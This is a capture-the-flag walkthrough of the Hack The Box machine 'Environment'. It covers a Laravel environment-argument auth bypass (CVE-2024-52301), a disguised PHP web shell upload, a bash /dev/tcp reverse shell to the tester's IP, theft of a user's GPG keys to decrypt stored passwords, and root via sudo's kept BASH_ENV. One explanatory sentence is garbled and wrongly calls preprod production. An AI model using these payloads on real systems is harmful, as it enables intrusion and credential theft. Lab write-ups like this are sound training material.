# Nmap
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Environment]
└─$ nmap -sC -sV -Pn 10.10.11.67 -oN ./nmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 01:37 AEST
Nmap scan report for 10.10.11.67
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
|_  256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://environment.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.57 seconds

```
Firstly, we need to add `environment.htb` to our hosts file

# Page check
**index**
![[images/Screenshot 2025-07-12 at 5.27.52 PM.png]]
From the index page, I did not find something interesting.

Let's use the `dirsearch` to enumerate the valid web-contents.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Environment]
└─$ dirsearch -u http://environment.htb                                                    
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/wither/Templates/htb-labs/Environment/reports/http_environment.htb/_25-07-13_01-50-44.txt

Target: http://environment.htb/

[01:50:44] Starting: 
[01:50:49] 403 -  555B  - /%2e%2e;/test                                     
[01:51:16] 403 -  555B  - /admin/.config                                    
[01:51:32] 403 -  555B  - /admpar/.ftppass                                  
[01:51:32] 403 -  555B  - /admrev/.ftppass                                  
[01:51:40] 403 -  555B  - /bitrix/.settings.bak                             
[01:51:40] 403 -  555B  - /bitrix/.settings
[01:51:40] 403 -  555B  - /bitrix/.settings.php.bak                         
[01:51:41] 301 -  169B  - /build  ->  http://environment.htb/build/         
[01:51:41] 403 -  555B  - /build/                                           
[01:51:58] 403 -  555B  - /ext/.deps                                        
[01:51:59] 200 -    0B  - /favicon.ico                                      
[01:52:07] 200 -    2KB - /index.php/login/                                 
[01:52:12] 403 -  555B  - /lib/flex/uploader/.flexProperties                
[01:52:12] 403 -  555B  - /lib/flex/uploader/.actionScriptProperties
[01:52:12] 403 -  555B  - /lib/flex/uploader/.project                       
[01:52:12] 403 -  555B  - /lib/flex/uploader/.settings                      
[01:52:12] 403 -  555B  - /lib/flex/varien/.flexLibProperties
[01:52:12] 403 -  555B  - /lib/flex/varien/.actionScriptProperties
[01:52:12] 403 -  555B  - /lib/flex/varien/.project
[01:52:12] 403 -  555B  - /lib/flex/varien/.settings
[01:52:14] 200 -    2KB - /login                                            
[01:52:14] 200 -    2KB - /login/                                           
[01:52:15] 302 -  358B  - /logout  ->  http://environment.htb/login         
[01:52:15] 302 -  358B  - /logout/  ->  http://environment.htb/login
[01:52:16] 403 -  555B  - /mailer/.env                                      
[01:52:37] 403 -  555B  - /resources/.arch-internal-preview.css             
[01:52:37] 403 -  555B  - /resources/sass/.sass-cache/
[01:52:37] 200 -   24B  - /robots.txt                                       
[01:52:46] 301 -  169B  - /storage  ->  http://environment.htb/storage/     
[01:52:46] 403 -  555B  - /storage/                                         
[01:52:52] 403 -  555B  - /twitter/.env                                     
[01:52:55] 403 -  555B  - /vendor/                                          
[01:52:57] 405 -  245KB - /upload                                           
[01:52:57] 405 -  245KB - /upload/
                                                                             
```

The login page would be our target here.
![](images/Pasted%20image%2020250713015354.png)
But I did not have any valid credit to pass the auth.

So let's use the `burpsuite` to catch the package of this POST request.
![](images/Pasted%20image%2020250713015750.png)
It send the token, email, password and remember parameter to server.

If we manually break the request submit, then we can get the error page.
![](images/Pasted%20image%2020250713015938.png)
We noticed that this service is powered by `PHP 8.2.28 — Laravel 11.30.0`
And we can get the part of code from web.php
```
})->name('unisharp.lfm.upload')->middleware([AuthMiddleware::class]);
 
Route::post('/login', function (Request $request) {
    $email = $_POST['email'];
    $password = $_POST['password'];
    $remember = $_POST['remember'];
 
    if($remember == 'False') {
        $keep_loggedin = False;
    } elseif ($remember == 'True') {
        $keep_loggedin = True;
    }
 
    if($keep_loggedin !== False) {
    // TODO: Keep user logged in if he selects "Remember Me?"
    }
 
```

There is no case for `else`, so we can try to submit another value to check what happened next.
```
_token=bRVlAPHADaGGgnPxBk9bMNw54m05XdN30714AdxG&email=test%40test.com&password=test&remember=1111
```

Then we get the new error message
![](images/Pasted%20image%2020250713020310.png)
and the other part of code in web.php
```
    $keep_loggedin = False;
    } elseif ($remember == 'True') {
        $keep_loggedin = True;
    }
 
    if($keep_loggedin !== False) {
    // TODO: Keep user logged in if he selects "Remember Me?"
    }
 
    if(App::environment() == "preprod") { //QOL: login directly as me in dev/local/preprod envs
        $request->session()->regenerate();
        $request->session()->put('user_id', 1);
        return redirect('/management/dashboard');
    }
 
    $user = User::where('email', $email)->first();
 
```

In this case, the current environment is `"preprod"` (the production environment), the user_id = 1 user_id = 1, and the current environment is `"preprod"` (user_id = 1).

Let's google search `how to bypass env of Laravel 11.30.0
![](images/Pasted%20image%2020250713020619.png)
Then we successfully get the result of links
```
CVE-2024-52301
https://www.cybersecurity-help.cz/vdb/SB20241112127
https://github.com/Nyamort/CVE-2024-52301
```

The `poc` gives us the hint:
```
Injected Argument for Production (http://localhost?--env=production)
```
![](images/Pasted%20image%2020250713021014.png)
Boom---
![](images/Pasted%20image%2020250713021046.png)
We successfully get into dashboard page.

# Upload reverse shell

There is only one uploading function here.
![](images/Pasted%20image%2020250713021326.png)
And also, we can find the upload image path
![](images/Pasted%20image%2020250713021434.png)
That means we can try to upload the malware to get the reverse shell.

Since it only restricts us from uploading pictures, we can bypass it using `burpsuite`. We need to add a dot after `php` to bypass it.
```
-----------------------------339973873135885886474223684192
Content-Disposition: form-data; name="upload"; filename="shell.php."
Content-Type: image/jpg

GIF89a
<?php $_="cmd"; @system($_REQUEST[$_]); ?>
-----------------------------339973873135885886474223684192--
```
![](images/Pasted%20image%2020250713022741.png)
Then we can come to this path 
```
http://environment.htb/storage/files/123.php?cmd=phpinfo();
```
![](images/Pasted%20image%2020250713022806.png)
But we wanna get the reverse shell, so let's change the payload here.
```
http://environment.htb/storage/files/shell.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/10.10.14.16/443+0%3E%261%27
```
Then we successfully get the shell as `www-data`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Environment]
└─$ nc -lnvp 443                               
listening on [any] 443 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.11.67] 45678
bash: cannot set terminal process group (831): Inappropriate ioctl for device
bash: no job control in this shell
www-data@environment:~/app/storage/app/public/files$ 

```

# Shell as hish

Firstly I would prefer to check the `.env` of this service
```
www-data@environment:~/app$ cat .env
cat .env
APP_NAME=Laravel
APP_ENV=production
APP_KEY=base64:BRhzmLIuAh9UG8xXCPuv0nU799gvdh49VjFDvETwY6k=
APP_DEBUG=true
APP_TIMEZONE=UTC
APP_URL=http://environment.htb
APP_VERSION=1.1

APP_LOCALE=en
APP_FALLBACK_LOCALE=en
APP_FAKER_LOCALE=en_US

APP_MAINTENANCE_DRIVER=file
# APP_MAINTENANCE_STORE=database

PHP_CLI_SERVER_WORKERS=4

BCRYPT_ROUNDS=12

LOG_CHANNEL=stack
LOG_STACK=single
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug

DB_CONNECTION=sqlite
# DB_HOST=127.0.0.1
# DB_PORT=3306
# DB_DATABASE=laravel
# DB_USERNAME=root
# DB_PASSWORD=

SESSION_DRIVER=database
SESSION_LIFETIME=120
SESSION_ENCRYPT=false
SESSION_PATH=/
SESSION_DOMAIN=null

```

But there is nothing useful in the directory of web service, but we can access to `/home/hish`
There is a `keyvault.gpg` file in the directory `/home/hish/backup`
```
www-data@environment:/home/hish$ ls -al
ls -al
total 36
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 .
drwxr-xr-x 3 root root 4096 Jan 12 11:51 ..
lrwxrwxrwx 1 root root    9 Apr  7 19:29 .bash_history -> /dev/null
-rw-r--r-- 1 hish hish  220 Jan  6  2025 .bash_logout
-rw-r--r-- 1 hish hish 3526 Jan 12 14:42 .bashrc
drwxr-xr-x 4 hish hish 4096 Jul 12 17:14 .gnupg
drwxr-xr-x 3 hish hish 4096 Jan  6  2025 .local
-rw-r--r-- 1 hish hish  807 Jan  6  2025 .profile
drwxr-xr-x 2 hish hish 4096 Jan 12 11:49 backup
-rw-r--r-- 1 root hish   33 Jul 12 15:00 user.txt

ww-data@environment:/home/hish/backup$ ls -al
ls -al
total 12
drwxr-xr-x 2 hish hish 4096 Jan 12 11:49 .
drwxr-xr-x 5 hish hish 4096 Apr 11 00:51 ..
-rw-r--r-- 1 hish hish  430 Jul 12 17:11 keyvault.gpg
```

At this time, the `www-data` user does not have permission to decrypte the `hish` user, but we can try to copy the `hish` user's `gpg` private key for decryption

So what we can do is
```
# 1. Copy the key directory of the hish user
cp -r /home/hish/.gnupg /tmp/mygnupg

# 2. Set permissions
chmod -R 700 /tmp/mygnupg

# 3. Confirm whether the private key exists
gpg --homedir /tmp/mygnupg --list-secret-keys

# 4. Decrypt keyvault.gpg
gpg --homedir /tmp/mygnupg --output /tmp/message.txt --decrypt /home/hish/backup/keyvault.gpg
```

Then we get the decrypted message
```
www-data@environment:/tmp$ cat message.txt
cat message.txt
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

Then we can successfully get into `hish` user shell  by using ssh with the credit `ENVIRONMENT.HTB -> marineSPm@ster!!`

```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Environment]
└─$ ssh hish@environment.htb                   
The authenticity of host 'environment.htb (10.10.11.67)' can't be established.
ED25519 key fingerprint is SHA256:GKtBN7PjK58Q8eTT80jQMUZYS5ZLu8ccptkyIueks18.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'environment.htb' (ED25519) to the list of known hosts.
hish@environment.htb's password: 
Linux environment 6.1.0-34-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.135-1 (2025-04-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Jul 12 17:16:45 2025 from 10.10.14.16
hish@environment:~$ 
```

# shell as root
Firstly I would like to check `sudo -l`
```
hish@environment:~$ sudo -l
[sudo] password for hish: 
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
```

It can be seen that `env_keep` retains the two environment variables `ENV` and `BASH_ENV`, so it can be used to bypass
```
hish@environment:~$ echo 'bash -p' > exp.sh
hish@environment:~$ chmod +x exp.sh
hish@environment:~$ sudo BASH_ENV=./exp.sh /usr/bin/systeminfo
root@environment:/home/hish# id
uid=0(root) gid=0(root) groups=0(root)
root@environment:/home/hish# 
```

# Description
This machine, as its name suggests, is related to the environment.

For user shell, exploit `App::environment() == "preprod"` to passby the authentication.
Then upload the web shell to get the reverse shell as `www-data`
Enumerating the file system, decrypte the message to get the valid credit of user `hish`

For root shell, by changing the `/usr/bin/systeminfo` environment variable, use `sudo` to elevate privileges.